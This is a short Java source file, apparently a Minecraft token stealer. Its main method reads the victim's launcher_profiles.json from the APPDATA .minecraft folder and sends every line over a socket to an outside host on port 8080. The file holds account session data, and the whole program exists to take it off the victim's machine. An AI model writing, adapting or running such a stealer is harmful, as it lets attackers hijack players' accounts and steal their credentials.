package me.urkkiz.token;
import java.io.*;
import java.net.Socket;

public class Client {
    public static void main(String[] args) throws IOException {
        System.out.println(System.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json");
        BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(new File(System.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json"))));
        Socket sock = new Socket("cumshitfart13579", 8080); 
        DataOutputStream out = new DataOutputStream(sock.getOutputStream());
        while (in.ready()) {
            out.writeUTF(in.readLine());
        }
        out.flush();
    }
}
